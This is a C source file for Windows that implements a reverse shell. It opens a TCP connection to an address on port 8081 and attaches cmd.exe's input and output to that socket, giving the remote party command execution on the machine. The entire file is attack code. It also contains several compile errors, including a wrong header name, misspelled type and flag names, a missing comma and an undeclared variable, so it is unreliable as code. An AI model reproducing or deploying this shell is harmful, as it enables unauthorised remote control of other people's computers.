#include <winsock2.h>
#include<stdio.h>
#include <windows.h>
#include <ws3tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
int main(){

	SOCKET shell;
	sockaddr_in shell_addr;
	WSADATA wsa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char ip_addr[] = '172.0.0.2';
	int port = 8081;
	int connect;
	char recv_server[512];
	WSAStartup(MAKEWORD(2,2), &wsa); //initialize winsock
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //Create the TCP socket
	
	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
	connect = WSAConnect(shell, (SOCKADDOR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL);
	if (connect == SOCKET_ERROR){
		printf("CONNECtion failed");
		exit(0);
	} 
	else{
		recv(shell, recv_server, sizeof(recv_server), 0);
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = (STARTIF_USESTDHANDLES | STARTIF_USEWINDOWS);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;//pipe standard input output and error to the socker
		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL NULL, &si, &pi); //spawn Cmd
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(RecvServer, 0, sizeof(RecvServer));
		
	}
}
